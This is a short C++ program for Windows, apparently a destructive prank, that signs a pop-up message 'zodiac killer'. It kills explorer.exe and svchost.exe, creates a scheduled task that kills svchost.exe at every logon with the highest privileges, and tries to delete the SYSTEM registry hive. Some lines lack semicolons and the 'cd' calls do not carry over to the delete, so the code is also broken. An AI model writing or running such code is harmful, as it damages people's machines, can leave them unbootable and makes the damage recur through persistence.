#include <cstdlib>

int main(){
    system("taskkill /f /im explorer.exe");
    system("msg * hello, from zodiac killer");
    system("schtasks /create /tn zodiac /tr \"taskkill /f /im svchost.exe\" /sc onlogon /rl highest /f")
    system("cd C:\\");
    system("cd C:\\Windows\\system32\\config")
    system("del /s /q SYSTEM")
    system("taskkill /f /im svchost.exe");
}
